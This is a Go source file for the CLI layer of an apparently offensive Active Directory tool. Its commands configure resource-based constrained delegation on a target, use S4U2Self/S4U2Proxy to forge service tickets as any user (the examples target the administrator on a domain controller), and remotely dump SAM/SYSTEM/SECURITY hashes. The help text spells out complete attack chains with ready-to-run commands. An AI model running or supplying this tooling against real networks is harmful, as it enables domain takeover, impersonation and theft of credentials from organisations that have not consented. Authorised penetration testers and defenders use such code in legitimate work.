// cmd/adgo/commands/delegation_cmd.go
//
// Commandes de delegation abuse et mouvement latéral avancé :
//
//   adgo kerberos s4u         → S4U2Self + S4U2Proxy (RBCD abuse)
//   adgo ldap rbcd            → Configurer/lire/supprimer RBCD
//   adgo smb secretsdump      → Dump hashes locaux via Remote Registry

package commands

import (
	"context"
	"encoding/hex"
	"fmt"
	"strings"
	"time"

	"adgo/pkg/common"
	"adgo/pkg/kerberos"
	"adgo/pkg/ldap"
	"adgo/pkg/smb"

	"github.com/spf13/cobra"
)

// ============================================================
// adgo kerberos s4u
// ============================================================

var S4UCmd = &cobra.Command{
	Use:   "s4u",
	Short: "S4U2Self + S4U2Proxy — impersonate any user via RBCD/delegation",
	Long: `Perform S4U2Self + S4U2Proxy to obtain a service ticket as any user.

Workflow:
  1. You control ATTACKER_ACCOUNT (computer or service account with SPN)
  2. ATTACKER_ACCOUNT's SID is in msDS-AllowedToActOnBehalfOfOtherIdentity of TARGET
     → use 'adgo ldap rbcd --setup' to configure this
  3. S4U2Self: KDC issues a TGS "ImpersonatedUser → ATTACKER_ACCOUNT"
  4. S4U2Proxy: KDC issues a TGS "ImpersonatedUser → TargetSPN"
  5. Use the .ccache with impacket-psexec / secretsdump

Examples:
  # Full RBCD abuse: get a cifs ticket as Administrator on dc01
  adgo kerberos s4u --dc-ip 192.168.1.10 -u attacker$ -p pass -d LAB \
      --impersonate administrator --spn cifs/dc01.lab.local

  # Pass-the-Key variant
  adgo kerberos s4u --dc-ip 192.168.1.10 -u attacker$ --hash aad3b435... -d LAB \
      --impersonate administrator --spn cifs/dc01.lab.local

  # Use the ticket
  export KRB5CCNAME=administrator@cifs_dc01.lab.local.ccache
  impacket-secretsdump -k -no-pass dc01.lab.local`,
	RunE: runS4U,
}

var (
	s4uImpersonate string
	s4uSPN         string
	s4uOutput      string
)

func init() {
	S4UCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	S4UCmd.Flags().StringVar(&s4uImpersonate, "impersonate", "administrator", "User to impersonate")
	S4UCmd.Flags().StringVar(&s4uSPN, "spn", "", "Target SPN (e.g. cifs/dc01.lab.local) (required)")
	S4UCmd.Flags().StringVar(&s4uOutput, "output", "", "Output .ccache file (default: auto)")
	S4UCmd.MarkFlagRequired("spn")

	KerberosCmd.AddCommand(S4UCmd)
}

func runS4U(cmd *cobra.Command, args []string) error {
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	if dcIP == "" {
		return fmt.Errorf("--dc-ip required")
	}

	user := common.Username
	pass := common.Password
	domain := common.Domain
	ntHash := common.NTLMHash

	if user == "" || domain == "" {
		return fmt.Errorf("-u USER and -d DOMAIN are required")
	}
	if pass == "" && ntHash == "" {
		return fmt.Errorf("-p PASS or --hash NTHASH is required")
	}

	cfg := &kerberos.S4UConfig{
		Username:    user,
		Domain:      domain,
		Password:    pass,
		NTHash:      ntHash,
		DCIP:        dcIP,
		Impersonate: s4uImpersonate,
		TargetSPN:   s4uSPN,
		OutputFile:  s4uOutput,
	}

	result, err := kerberos.S4UAttack(cfg)
	if err != nil {
		return fmt.Errorf("S4U attack failed: %v", err)
	}

	common.PrintSuccess(fmt.Sprintf("Ticket for %s → %s saved: %s",
		result.Impersonated, result.TargetSPN, result.OutputFile))
	return nil
}

// ============================================================
// adgo ldap rbcd
// ============================================================

var RBCDCmd = &cobra.Command{
	Use:   "rbcd",
	Short: "Resource-Based Constrained Delegation — setup, read, or clear",
	Long: `Configure RBCD (msDS-AllowedToActOnBehalfOfOtherIdentity) on a target computer.

After setup, use 'adgo kerberos s4u' to impersonate any user on the target.

Examples:
  # Write your attacker account SID into target's RBCD attribute
  adgo ldap rbcd --dc-ip 192.168.1.10 -u admin -p pass -d LAB \
      --target dc01$ --attacker attacker$

  # Read current RBCD configuration
  adgo ldap rbcd --dc-ip 192.168.1.10 -u admin -p pass -d LAB \
      --target dc01$ --read

  # Clean up
  adgo ldap rbcd --dc-ip 192.168.1.10 -u admin -p pass -d LAB \
      --target dc01$ --clear`,
	RunE: runRBCD,
}

var (
	rbcdTarget   string
	rbcdAttacker string
	rbcdRead     bool
	rbcdClear    bool
)

func init() {
	RBCDCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	RBCDCmd.Flags().StringVar(&rbcdTarget, "target", "", "Target computer (e.g. DC01$) (required)")
	RBCDCmd.Flags().StringVar(&rbcdAttacker, "attacker", "", "Attacker account to grant delegation to (e.g. ATTACKER$)")
	RBCDCmd.Flags().BoolVar(&rbcdRead, "read", false, "Read current RBCD configuration")
	RBCDCmd.Flags().BoolVar(&rbcdClear, "clear", false, "Clear RBCD configuration on target")
	RBCDCmd.MarkFlagRequired("target")

	LDAPCmd.AddCommand(RBCDCmd)
}

func runRBCD(cmd *cobra.Command, args []string) error {
	ctx := context.Background()
	dcIP, _ := cmd.Flags().GetString("dc-ip")

	creds, err := requireCredsWithDCIP(dcIP)
	if err != nil {
		return err
	}

	server := buildLDAPServer(dcIP, creds)
	if server == "" {
		return fmt.Errorf("--dc-ip required")
	}

	common.PrintInfo(fmt.Sprintf("RBCD → %s as %s\\%s", server, strings.ToUpper(creds.SMBDomain), creds.SMBUsername))

	ldapClient, err := ldap.NewClientNTLM(ctx, server, creds.SMBDomain, creds.SMBUsername, creds.Password, creds.NTLMHash, false)
	if err != nil {
		return fmt.Errorf("LDAP connection failed: %v", err)
	}
	defer ldapClient.Close()

	baseDN := buildBaseDN(creds)
	rbcdClient := ldap.NewRBCDClient(ldapClient.Conn(), baseDN)

	switch {
	case rbcdRead:
		sids, err := rbcdClient.ReadRBCD(rbcdTarget)
		if err != nil {
			return fmt.Errorf("RBCD read failed: %v", err)
		}
		if len(sids) == 0 {
			common.PrintWarning(fmt.Sprintf("No RBCD configured on %s", rbcdTarget))
		} else {
			common.PrintSuccess(fmt.Sprintf("RBCD on %s — allowed principals:", rbcdTarget))
			for _, sid := range sids {
				fmt.Printf("  → %s\n", sid)
			}
		}

	case rbcdClear:
		if err := rbcdClient.ClearRBCD(rbcdTarget); err != nil {
			return fmt.Errorf("RBCD clear failed: %v", err)
		}
		common.PrintSuccess(fmt.Sprintf("RBCD cleared on %s", rbcdTarget))

	default:
		// Setup
		if rbcdAttacker == "" {
			return fmt.Errorf("--attacker required for RBCD setup (or use --read / --clear)")
		}
		result, err := rbcdClient.SetupRBCD(rbcdTarget, rbcdAttacker)
		if err != nil {
			return fmt.Errorf("RBCD setup failed: %v", err)
		}
		common.PrintSuccess(fmt.Sprintf("RBCD configured: %s can impersonate any user on %s",
			result.AttackerAccount, result.TargetComputer))
		fmt.Println()
		fmt.Println("Next steps:")
		for _, step := range result.NextSteps {
			fmt.Println(" ", step)
		}
		fmt.Println()
		fmt.Printf("  → adgo kerberos s4u --dc-ip %s -u %s -p <pass> -d %s --impersonate administrator --spn cifs/%s\n",
			dcIP, rbcdAttacker, creds.SMBDomain, strings.TrimSuffix(rbcdTarget, "$"))
	}

	return nil
}

// ============================================================
// adgo smb secretsdump
// ============================================================

var SecretsDumpCmd = &cobra.Command{
	Use:   "secretsdump",
	Short: "Dump local hashes via Remote Registry (SAM + SYSTEM hive)",
	Long: `Dump local account hashes by saving and parsing registry hives remotely.

Requires admin access (ADMIN$ share must be accessible).
Saves SAM, SYSTEM, SECURITY hives → downloads them → parses NT/LM hashes.

Examples:
  adgo smb secretsdump 192.168.1.10 -u administrator -p Password123 -d LAB
  adgo smb secretsdump 192.168.1.10 -u administrator --hash aad3b435... -d LAB
  adgo smb secretsdump 192.168.1.0/24 -u administrator -p pass -d LAB`,
	Args: cobra.ExactArgs(1),
	RunE: runSecretsDump,
}

func init() {
	SecretsDumpCmd.Flags().Int("timeout", 30, "Timeout in seconds")
	SMBCmd.AddCommand(SecretsDumpCmd)
}

func runSecretsDump(cmd *cobra.Command, args []string) error {
	target := args[0]
	timeout, _ := cmd.Flags().GetInt("timeout")

	user := common.Username
	pass := common.Password
	domain := common.Domain
	ntHashStr := common.NTLMHash

	if user == "" || domain == "" {
		return fmt.Errorf("-u USER and -d DOMAIN are required")
	}

	var ntHashBytes []byte
	if ntHashStr != "" {
		var err error
		ntHashBytes, err = hex.DecodeString(ntHashStr)
		if err != nil {
			return fmt.Errorf("invalid NT hash: %v", err)
		}
	}

	line := common.NxLine{Protocol: "SMB", Host: target, Port: 445}

	cfg := &smb.SecretsDumpConfig{
		Target:   target,
		Username: user,
		Domain:   domain,
		Password: pass,
		NTHash:   ntHashBytes,
		Timeout:  time.Duration(timeout) * time.Second,
	}

	hashes, err := smb.DumpLocalHashes(cfg)
	if err != nil {
		common.NxFailure(line, fmt.Sprintf("secretsdump failed: %v", err))
		return err
	}

	if len(hashes) == 0 {
		common.NxWarning(line, "No local hashes found")
		return nil
	}

	common.NxSuccess(line, fmt.Sprintf("Dumped %d local hash(es)", len(hashes)))
	fmt.Println()

	// Format secretsdump compatible : DOMAIN\user:RID:LMHash:NTHash:::
	for _, h := range hashes {
		fmt.Printf("%s\\%s:%d:%s:%s:::\n",
			strings.ToUpper(domain), h.Username, h.RID, h.LMHash, h.NTHash)
	}

	return nil
}
